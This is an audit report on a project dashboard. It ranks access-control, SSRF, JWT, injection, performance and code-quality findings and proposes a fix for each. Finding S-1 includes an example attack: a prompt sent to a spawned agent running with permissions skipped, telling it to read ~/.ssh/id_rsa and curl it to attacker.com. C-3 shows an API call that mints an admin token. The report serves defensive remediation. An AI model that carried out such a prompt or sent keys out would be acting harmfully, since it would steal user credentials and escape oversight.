# Full Security, Performance & Quality Audit Findings

**Date:** 2026-04-29  
**Branch:** feat/robustness-hardening  
**Scope:** Entire project (not just branch delta)  
**Method:** Three parallel specialist agents — OWASP security, performance, code quality

---

## Priority Legend

| Level | Meaning |
|-------|---------|
| P0 Critical | Exploitable today, fix before next merge |
| P1 High Security | Fix this week |
| P2 High Perf/Quality | Fix this sprint |
| P3 Medium | Next sprint |
| P4 Low | Nice-to-have |

---

## P0 — Critical Security (Fix Today)

### C-1: `task_deleted` SSE Event Leaks Cross-User in Multi-User Mode
- **OWASP:** A01 Broken Access Control
- **File:** `server/index.ts:233-250` (`broadcastTaskEvent`)
- **Root cause:** `const task = getTaskById(event.taskId)` returns `null` for `task_deleted` (row already gone). The guard `if (!client.isAdmin && task && task.userId !== client.userId)` short-circuits when `task` is null — so ALL connected clients receive every `task_deleted` event.
- **Attack:** User B subscribes to `/api/tasks/stream`. User A deletes a task. User B receives the `task_deleted` event with User A's task UUID.
- **Fix:** Embed `userId` in the `task_deleted` event payload at emit time (line 332 in taskRoutes.ts), then extract it in `broadcastTaskEvent` for filtering.

### C-3: Non-Admin Users Can Mint `keys:manage` MCP Tokens
- **OWASP:** A01 Broken Access Control
- **File:** `server/routes/apiKeyRoutes.ts:27-53`
- **Root cause:** `POST /api/settings/api-keys` accepts any scope (including `keys:manage`) without checking `req.user!.isAdmin`. `keys:manage` implies all other scopes. The key also has no `userId`, so it grants cross-user access via MCP.
- **Attack:** Any org member calls `POST /api/settings/api-keys { name:"x", scopes:["keys:manage"] }`, gets a full-admin MCP token, and can manage all tasks across all users.
- **Fix:** Require `req.user!.isAdmin` on POST and DELETE. Set `userId: req.user!.id` on creation.

### S-1: `/api/agents/spawn` Accepts Arbitrary `cwd`+`prompt`+`skipPermissions` — Insider RCE
- **OWASP:** A03 Injection
- **File:** `server/routes/agentRoutes.ts:56-75`, `server/spawnManager.ts:130-175`
- **Root cause:** Any authenticated user can spawn `claude --dangerously-skip-permissions -p <arbitrary-prompt>` in any existing directory. The spawned process inherits the full server environment (`JWT_SECRET`, `GITHUB_CLIENT_SECRET`, `OBSIDIAN_API_KEY`, etc.).
- **Attack:** Authenticated user POSTs `{ prompt: "Read ~/.ssh/id_rsa and curl it to attacker.com", cwd: "/Users/victim", skipPermissions: true }`.
- **Fix:** (a) Require `req.user!.isAdmin` on spawn. (b) Remove `skipPermissions` support entirely — drop the field server-side before passing to `spawnManager`. (c) Add `DASHBOARD_ALLOWED_CWDS` env var allow-list for `cwd` validation.

---

## P1 — High Security (This Week)

### S-2: `parseFullSession` Reads Any Session Without Ownership Check
- **OWASP:** A01 Broken Access Control
- **File:** `server/jsonlParser.ts:490-508`, `server/routes/agentRoutes.ts:92-106`
- **Root cause:** `GET /api/agents/:sessionId/output` validates UUID format but then scans ALL `~/.claude/projects` dirs. In multi-user mode (single OS user, multiple GitHub users), any authenticated user knowing a sessionId can read another user's full transcript.
- **Fix:** Cross-reference sessionId against the requesting user's tasks/agents before reading.

### S-3: Webhook SSRF — No RFC1918 Block, No DNS Rebinding Protection
- **OWASP:** A10 SSRF
- **File:** `server/notifications/adapters/webhook.ts:40-56`
- **Root cause:** `isSafeWebhookUrl` blocks only loopback. RFC1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) is reachable. No hostname→IP resolution before fetch.
- **Fix:** DNS-resolve hostname, check resolved IP against RFC1918 + link-local deny-list. Add 5s `AbortController` timeout.

### S-4: JWT Has No Minimum Entropy, No `alg`/`iss`/`aud` Validation
- **OWASP:** A02 Cryptographic Failures
- **File:** `server/auth/jwtUtils.ts`
- **Root cause:** Any non-empty `JWT_SECRET` is accepted. No `header.alg === 'HS256'` assertion. No `iss`/`aud` claims. Leaked tokens valid for 8h with no revocation.
- **Fix:** Validate `Buffer.from(JWT_SECRET).length >= 32` at startup. Assert `header.alg === 'HS256'` in `verifyJwt`.

### S-5: OAuth Cookie Lacks `secure` Flag; `redirect_uri` Uses `http://`
- **OWASP:** A02 Cryptographic Failures
- **File:** `server/routes/authRoutes.ts:21-55`
- **Root cause:** `redirect_uri: \`http://${host}:${port}/auth/callback\`` and cookie `secure` not set. On multi-machine deployments, OAuth code and session JWT ride plaintext.
- **Fix:** Use `process.env.DASHBOARD_PUBLIC_URL` for redirect_uri when set. Set `secure: true` when host is non-loopback.

---

## P2 — High Performance + Quality (This Sprint)

### P-1: `enrichTask` Causes N+1 DB Queries on Every List Request
- **File:** `server/routes/taskRoutes.ts:89-126`, `server/db/stageRunsRepo.ts:86-100`
- **Root cause:** `GET /api/tasks` does `.map(enrichTask)` — each `enrichTask` issues 1-2 DB queries. 100 tasks = 100-200 queries per request and per SSE `broadcastEnrichedUpdate`.
- **Fix:** Add `getLatestStageRunsForTasks(taskIds[])` batch helper, use in `enrichTasksBulk()`.

### P-2: SSE Broadcast Fetches Remotes C×R Times per Tick
- **File:** `server/index.ts:172-221`
- **Root cause:** For each of C connected clients, `aggregateAgents(localAgents, allRemotes)` makes R remote HTTP calls. With 3 clients and 2 remotes: 6 remote fetches per 3s tick instead of 2.
- **Fix:** Fetch each unique remote URL once per tick, cache result, fan out cached results to clients.

### P-3+P-4: `getPreviousStageOutput` + Picker Both Issue Per-Task DB Calls per Tick
- **File:** `server/pipeline/orchestrator.ts:290-302`, `server/pipeline/orchestrator.ts:816-821`
- **Root cause:** `getPreviousStageOutput` walks up to 10 sequential `getLatestStageRun` calls per stage execution. `pickNextTasksForFreeSlots` calls `getLatestStageRun` per pickable task per 2s tick.
- **Fix:** Single batch query for both; reuse the `allRunning` snapshot already fetched in the tick.

### Q-2: UUID Validation Missing on `:id` Route Params in taskRoutes
- **File:** `server/routes/taskRoutes.ts` (multiple handlers)
- **Root cause:** `req.params.id` passed directly to `getTaskById(...)` without UUID format check. Inconsistent with `agentRoutes.ts`.
- **Fix:** `router.param('id', ...)` middleware that validates UUID format and returns 400 on mismatch.

### Q-3: No Length/Range Validation on Task Fields
- **File:** `server/routes/taskRoutes.ts:177-266`
- **Root cause:** `title`, `description`, `cwd`, `maxIterations`, `tokenBudget` accept arbitrary length/values. `maxIterations: -5` would be accepted.
- **Fix:** Add bounds: `title <= 200`, `description <= 10_000`, `cwd <= 4096`, `maxIterations` integer in [1..100].

### Q-5: Unhandled Promise Rejection in Task Dependencies Handler
- **File:** `server/routes/taskRoutes.ts:838`
- **Root cause:** `throw err` inside an async Express 4 route handler → unhandled promise rejection; global error middleware never sees it.
- **Fix:** Replace `throw err` with `next(err)` or `res.status(500).json({ error: 'Internal error' })`.

### Q-7: Permission-Resolve Handler Not in DB Transaction
- **File:** `server/routes/taskRoutes.ts:687-770`
- **Root cause:** Multiple reads + writes (resolve request, create permission, update stage run, audit) are non-atomic. Concurrent resolves of the same request could double-create permissions.
- **Fix:** Wrap in `db.transaction(() => { ... })()`.

---

## P3 — Medium (Next Sprint)

| # | Area | Finding | File |
|---|------|---------|------|
| P-5 | Perf | TTL config cache not invalidated on REST writes → up to 5s stale config (can affect timeout kill) | `server/pipeline/orchestrator.ts:94-103` |
| S-6 | Security | `requireApiToken` fail-open when `DASHBOARD_API_TOKEN` unset — no startup warning | `server/middleware.ts:6-11` |
| S-7 | Security | `process.kill(run.pid)` uses DB-stored PID without validation against spawn registry | `server/routes/taskRoutes.ts:732` |
| P-6 | Perf | `channelDiscovery` forks `ps` per PID instead of once per scan | `server/channelDiscovery.ts:77-140` |
| P-7 | Perf | `parseFullSession` reads up to 10MB synchronously → can stall event loop | `server/jsonlParser.ts:490-677` |
| P-8 | Perf | `useTasks` does full HTTP refetch on `stage_run_updated` events | `src/composables/useTasks.ts:124-128` |
| Q-1 | Quality | Env vars (`DASHBOARD_SPAWN_RATE_LIMIT`, `DASHBOARD_PORT`) crash on bad input instead of graceful diagnostic | `server/spawnManager.ts:28-39`, `server/index.ts:44` |
| Q-4 | Quality | `activeTurns` lock in `refineRoutes` has TOCTOU race | `server/routes/refineRoutes.ts:57,105` |
| Q-6 | Quality | Error messages from exceptions leaked to clients | `server/routes/taskRoutes.ts:221,264,533` |
| Q-8 | Tests | No tests for: `spawnManager`, `refineRoutes`, `middleware`, `requireAuth` | — |

---

## P4 — Low

- SSE broadcast has no `processing` guard → scan pile-up risk
- `sessionCache` FIFO eviction instead of LRU
- `costTrend.shift()` O(n) → circular buffer
- CSP `unsafe-inline` for styles
- `jsonlParser.ts` widespread `any` types
- `refineRoutes.ts` three-guard concurrency pattern fragile
- Remote aggregator timeout too long, no circuit breaker
- `cookieParser()` without signing secret

---

## Already Implemented (Prior Wave)

The following were addressed in the `8811fa5` / `92e7023` commits on this branch:
- CSP + security headers (`server/index.ts`)
- UUID validation in `parseFullSession`
- Parallel subagent JSONL reads
- `listRunningStageRuns` deduplication per tick
- TTL cache for `pipeline_config` reads
- Auth failure + rate-limit logging
- `shallowRef` for tasks array

---

## Remediation Plan

See `docs/superpowers/plans/2026-04-29-wave1-critical-security.md` (P0+P1 criticals).  
Future waves documented in `docs/superpowers/plans/2026-04-29-wave2-high-security.md` and `docs/superpowers/plans/2026-04-29-wave3-perf-quality.md`.
